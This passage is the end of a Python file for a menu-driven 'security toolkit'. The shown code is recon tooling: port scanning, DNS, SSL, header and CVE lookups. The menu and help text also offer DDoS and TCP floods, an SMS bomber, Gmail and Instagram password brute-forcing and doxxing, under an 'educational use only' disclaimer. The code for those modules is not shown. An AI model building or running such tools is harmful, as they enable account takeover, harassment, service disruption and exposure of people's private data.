            self.save_results(domain, results)
        input("\n↩️ Press Enter to return to menu...")

    def save_results(self, domain, results):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"subdomains_{domain}_{timestamp}.txt"
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=" * 80 + "\n")
                f.write(f"SUBDOMAIN SCAN REPORT: {domain}\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Found {len(results)} subdomains:\n\n")
                for sub, ip in results:
                    f.write(f"{sub}.{domain} -> {ip}\n")
            self.color.print_success(f"✅ Report saved: {filename}")
        except Exception as e:
            self.color.print_error(f"Error saving: {e}")

class PortScannerAdvanced:
    def __init__(self, color_manager):
        self.color = color_manager

    def scan_port(self, host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def get_service_name(self, port):
        services = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"}
        return services.get(port, "Unknown")

    def scan(self, host, ports):
        self.color.print_header(f"🔌 ADVANCED PORT SCAN: {host}", "─")
        open_ports = []
        total = len(ports)
        for i, port in enumerate(ports):
            self.color.progress_bar(i + 1, total, prefix="Scanning ports:", suffix=f"Open: {len(open_ports)}", length=40)
            if self.scan_port(host, port):
                service = self.get_service_name(port)
                open_ports.append((port, service))
                self.color.print_success(f"✅ Port {port} ({service}) is OPEN")
            time.sleep(0.05)
        print()
        if open_ports:
            self.color.print_header("📊 OPEN PORTS", "─")
            for port, service in open_ports:
                print(f"  {port}: {service}")
        else:
            self.color.print_warning("No open ports found")
        return open_ports

    def run(self):
        self.color.print_header("🔌 ADVANCED PORT SCANNER", "─")
        host = input("Enter host or IP: ").strip()
        if not host:
            self.color.print_error("Host not entered")
            input("\n↩️ Press Enter to continue...")
            return
        print("\nSelect port range:")
        print("1. Common ports (1-1000)")
        print("2. All ports (1-65535)")
        print("3. Custom range")
        choice = input("Choice: ").strip()
        if choice == "1":
            ports = list(range(1, 1001))
        elif choice == "2":
            ports = list(range(1, 65536))
        elif choice == "3":
            start = int(input("Start port: "))
            end = int(input("End port: "))
            ports = list(range(start, end + 1))
        else:
            ports = list(range(1, 1001))
        self.scan(host, ports)
        input("\n↩️ Press Enter to return to menu...")

class DNSRecon:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🌐 DNS RECONNAISSANCE", "─")
        domain = input("Enter domain: ").strip()
        if not domain:
            self.color.print_error("Domain not entered")
            input("\n↩️ Press Enter to continue...")
            return
        try:
            import dns.resolver
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV']
            for record in record_types:
                try:
                    answers = dns.resolver.resolve(domain, record)
                    print(f"\n{record} records:")
                    for rdata in answers:
                        print(f"  {rdata}")
                except:
                    pass
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class SSLChecker:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🔒 SSL CERTIFICATE CHECKER", "─")
        domain = input("Enter domain: ").strip()
        if not domain:
            self.color.print_error("Domain not entered")
            input("\n↩️ Press Enter to continue...")
            return
        self.color.print_info(f"Checking SSL for {domain}...")
        try:
            import ssl
            import socket
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    print(f"\n📋 Certificate information:")
                    print(f"  Subject: {cert.get('subject', 'N/A')}")
                    print(f"  Issuer: {cert.get('issuer', 'N/A')}")
                    print(f"  Expiry: {cert.get('notAfter', 'N/A')}")
                    print(f"  SAN: {cert.get('subjectAltName', 'N/A')}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class TechDetector:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🔧 WEBSITE TECHNOLOGY DETECTOR", "─")
        url = input("Enter website URL: ").strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self.color.print_info(f"Detecting technologies for {url}...")
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            print(f"\n📋 Server: {headers.get('Server', 'Unknown')}")
            print(f"  Powered-By: {headers.get('X-Powered-By', 'Unknown')}")
            print(f"  Framework: {headers.get('X-Framework', 'Unknown')}")
            print(f"  CMS: {headers.get('X-CMS', 'Unknown')}")
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                print("  Detected: WordPress")
            if 'Drupal' in response.text:
                print("  Detected: Drupal")
            if 'Joomla' in response.text:
                print("  Detected: Joomla")
            if 'laravel' in response.text.lower():
                print("  Detected: Laravel")
            if 'django' in response.text.lower():
                print("  Detected: Django")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class WaybackMachine:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("📜 WAYBACK MACHINE LOOKUP", "─")
        url = input("Enter website URL: ").strip()
        self.color.print_info(f"Looking up historical data for {url}...")
        try:
            response = requests.get(f"https://archive.org/wayback/available?url={url}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('archived_snapshots'):
                    snapshots = data['archived_snapshots']
                    print(f"\n📋 Available snapshots:")
                    for key, value in snapshots.items():
                        print(f"  {key}: {value.get('url', 'N/A')}")
                        print(f"    Timestamp: {value.get('timestamp', 'N/A')}")
                else:
                    self.color.print_warning("No snapshots found")
            else:
                self.color.print_error("Could not fetch data")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class SecurityHeaders:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🛡️ SECURITY HEADERS CHECKER", "─")
        url = input("Enter website URL: ").strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        self.color.print_info(f"Checking security headers for {url}...")
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            security_headers = ['Strict-Transport-Security', 'Content-Security-Policy', 'X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection', 'Referrer-Policy', 'Permissions-Policy']
            print(f"\n📋 Security Headers:")
            for header in security_headers:
                value = headers.get(header, 'Not set')
                if value != 'Not set':
                    self.color.print_success(f"  ✅ {header}: {value[:50]}")
                else:
                    self.color.print_error(f"  ❌ {header}: {value}")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class CVESearch:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🔍 CVE DATABASE SEARCH", "─")
        keyword = input("Enter keyword to search (e.g., Apache, WordPress): ").strip()
        self.color.print_info(f"Searching CVEs for {keyword}...")
        try:
            response = requests.get(f"https://cve.circl.lu/api/last", timeout=10)
            if response.status_code == 200:
                data = response.json()
                count = 0
                print(f"\n📋 Recent CVEs:")
                for cve in data[:20]:
                    if keyword.lower() in str(cve).lower():
                        print(f"  {cve.get('id', 'N/A')}: {cve.get('summary', 'N/A')[:100]}")
                        count += 1
                if count == 0:
                    self.color.print_warning("No matching CVEs found in recent list")
            else:
                self.color.print_error("Could not fetch CVE data")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class ReverseIP:
    def __init__(self, color_manager):
        self.color = color_manager

    def run(self):
        self.color.print_header("🔄 REVERSE IP LOOKUP", "─")
        ip = input("Enter IP address: ").strip()
        self.color.print_info(f"Looking up domains on {ip}...")
        try:
            response = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
            if response.status_code == 200:
                domains = response.text.strip().split('\n')
                print(f"\n📋 Domains hosted on {ip}:")
                for domain in domains[:20]:
                    print(f"  {domain}")
                if len(domains) > 20:
                    print(f"  ... and {len(domains) - 20} more")
            else:
                self.color.print_error("Could not fetch data")
        except Exception as e:
            self.color.print_error(f"Error: {e}")
        input("\n↩️ Press Enter to return to menu...")

class DressenSecurityToolkit:
    def __init__(self):
        self.color = ColorManager()
        self.nick_search = NicknameSearch(self.color)
        self.phone_probe = PhoneNumberProbe(self.color)
        self.vuln_scanner = VulnerabilityScanner(self.color)
        self.sys_monitor = SystemMonitor(self.color)
        self.pass_generator = PasswordGenerator(self.color)
        self.utilities = Utilities(self.color)
        self.dox_module = DOXModule(self.color)
        self.ddos_attack = DDoSAttack(self.color)
        self.sms_bomber = SMSBomber(self.color)
        self.ip_dos = IPDOSAttack(self.color)
        self.service_menu = ServiceMenu(self.color)
        self.email_hack = EmailHack(self.color)
        self.instagram_hack = InstagramHack(self.color)
        self.subdomain_scanner = SubdomainScanner(self.color)
        self.port_scanner_advanced = PortScannerAdvanced(self.color)
        self.dns_recon = DNSRecon(self.color)
        self.ssl_checker = SSLChecker(self.color)
        self.tech_detector = TechDetector(self.color)
        self.wayback_machine = WaybackMachine(self.color)
        self.security_headers = SecurityHeaders(self.color)
        self.cve_search = CVESearch(self.color)
        self.reverse_ip = ReverseIP(self.color)
        self.running = True

    def show_main_menu(self):
        clear_screen()
        self.color.print_3d_ascii_header()
        print(f"\nMAIN MENU:\n")
        menu_items = [
            ("👤", "Nickname Search (20+ platforms)"),
            ("🔍", "Phone Number Probe (Extended OSINT)"),
            ("🕵️", "DOX Instruments (IP/Domain/Email/Username)"),
            ("⚡", "DDoS Attack (HTTP Flood)"),
            ("💣", "SMS Bomber (Telegram)"),
            ("🌐", "IP DOS Attack (TCP Flood)"),
            ("🔧", "Services and Online Tools"),
            ("📧", "Gmail Email Hack (SMTP Bruteforce)"),
            ("📸", "Instagram Hack (Password Bruteforce)"),
            ("🔍", "Vulnerability Scanner (Web)"),
            ("📊", "System Monitor (Real-time)"),
            ("🔐", "Password Generator (Secure)"),
            ("⚙️", "Utilities (Hash/Network/QR)"),
            ("🌐", "Subdomain Scanner"),
            ("🔌", "Advanced Port Scanner"),
            ("🌐", "DNS Reconnaissance"),
            ("🔒", "SSL Certificate Checker"),
            ("🔧", "Website Technology Detector"),
            ("📜", "Wayback Machine Lookup"),
            ("🛡️", "Security Headers Checker"),
            ("🔍", "CVE Database Search"),
            ("🔄", "Reverse IP Lookup"),
            ("❓", "Help and Information"),
            ("🚪", "Exit"),
        ]
        for i, (emoji, desc) in enumerate(menu_items, 1):
            self.color.print_menu_item(i, emoji, desc)

    def show_help(self):
        clear_screen()
        self.color.print_header("❓ HELP AND INFORMATION", "─")
        help_text = f"""
ABOUT THE PROGRAM:

DRESSEN Security Toolkit v5.0 ULTIMATE - comprehensive security analysis tool,
OSINT investigations, pentesting and system monitoring. Program is intended exclusively
for educational purposes and testing own systems.

NEW FEATURES v5.0:

🕵️ DOX Instruments (Extended):
  • Full information by IP addresses (WHOIS, geolocation, reputation)
  • Domain information (WHOIS, DNS, hosting)
  • Email information (breaches, MX records)
  • Username search across platforms
  • Phone number OSINT
  • Bitcoin/Ethereum wallet analysis
  • Webcam search by location
  • Google Maps search by coordinates

🌐 Network Tools:
  • Subdomain scanner
  • Advanced port scanner (1-65535)
  • DNS reconnaissance
  • SSL certificate checker
  • Reverse IP lookup

🛡️ Web Security:
  • Website technology detector
  • Wayback Machine historical data
  • Security headers checker
  • CVE database search
  • Vulnerability scanner

🔧 Other Features:
  • Nickname search (20+ platforms)
  • Phone number probe with geolocation
  • DDoS attack simulation
  • SMS bomber (Telegram)
  • Email/Instagram bruteforce
  • Password generator with strength assessment
  • System monitor
  • Hash calculator (MD5, SHA1, SHA256, SHA512, SHA3, BLAKE2)

IMPORTANT WARNING:

⚠️ This program is intended ONLY for:
   • Educational purposes
   • Testing own systems
   • Raising security awareness

🚫 Prohibited to use for:
   • Unauthorized access to systems
   • Privacy violations
   • Any illegal actions

AUTHOR'S RIGHTS:

© 2024 DRESSEN Security Toolkit Ultimate
Version: 5.0 Ultimate Edition (with DOX module)
License: For educational use only
Support: Python 3.7+
by @concole_hack
"""
        self.color.animate_text(help_text, delay=0.001)
        input(f"\n↩️ Press Enter to return to menu...")

    def run(self):
        while self.running:
            try:
                self.show_main_menu()
                choice = input(f"\n🎯 Select action (1-24): ").strip()
                if choice == "1":
                    self.nick_search.run()
                elif choice == "2":
                    self.phone_probe.run()
                elif choice == "3":
                    self.dox_module.run()
                elif choice == "4":
                    self.ddos_attack.run()
                elif choice == "5":
                    self.sms_bomber.run()
                elif choice == "6":
                    self.ip_dos.run()
                elif choice == "7":
                    self.service_menu.run()
                elif choice == "8":
                    self.email_hack.run()
                elif choice == "9":
                    self.instagram_hack.run()
                elif choice == "10":
                    self.vuln_scanner.run()
                elif choice == "11":
                    self.sys_monitor.run()
                elif choice == "12":
                    self.pass_generator.run()
                elif choice == "13":
                    self.utilities.run()
                elif choice == "14":
                    self.subdomain_scanner.run()
                elif choice == "15":
                    self.port_scanner_advanced.run()
                elif choice == "16":
                    self.dns_recon.run()
                elif choice == "17":
                    self.ssl_checker.run()
                elif choice == "18":
                    self.tech_detector.run()
                elif choice == "19":
                    self.wayback_machine.run()
                elif choice == "20":
                    self.security_headers.run()
                elif choice == "21":
                    self.cve_search.run()
                elif choice == "22":
                    self.reverse_ip.run()
                elif choice == "23":
                    self.show_help()
                elif choice == "24":
                    self.color.print_header("👋 EXITING PROGRAM", "─")
                    self.color.animate_text("Thank you for using DRESSEN Security Toolkit Ultimate!", 0.03)
                    print(f"\n✨ Goodbye! ✨")
                    self.running = False
                else:
                    self.color.print_error("❌ Invalid choice. Try again.")
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n\n⚠️ Program interrupted by user")
                confirm = input(f"Exit program? (y/n): ").lower()
                if confirm == "y":
                    self.running = False
            except Exception as e:
                self.color.print_error(f"❌ Critical error: {e}")
                input(f"\n↩️ Press Enter to continue...")

def main():
    try:
        script_dir = setup_working_directory()
        print(f"📁 Working directory: {script_dir}")
        if not check_python_version():
            input("Press Enter to exit...")
            return
        clear_screen()
        print(f"\n{'═' * 80}")
        color = ColorManager()
        color.print_gradient_text("🚀 LOADING DRESSEN SECURITY TOOLKIT ULTIMATE v5.0")
        print(f"{'═' * 80}\n")
        for i in range(101):
            bar_length = 60
            filled = i // 2
            bar = ""
            for j in range(bar_length):
                if j < filled:
                    ratio = j / max(1, bar_length - 1)
                    r = int(0 + (255 - 0) * ratio)
                    g = int(255 + (0 - 255) * ratio)
                    b = int(0 + (255 - 0) * ratio)
                    bar += f"\033[38;2;{r};{g};{b}m█\033[0m"
                else:
                    bar += "░"
            print(f"\r🔧 Initializing system: [{bar}] {i}%", end="")
            time.sleep(0.01)
        print("\n\n")
        color.print_header("⚙️ SYSTEM SETUP", "─")
        install = input(f"📦 Install required libraries? (y/n): ").lower()
        if install == "y":
            success = install_dependencies()
            if not success:
                color.print_warning("⚠️ Some libraries failed to install. Functionality may be limited.")
                time.sleep(2)
        app = DressenSecurityToolkit()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n👋 Program terminated")
    except Exception as e:
        print(f"\n❌ Critical error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
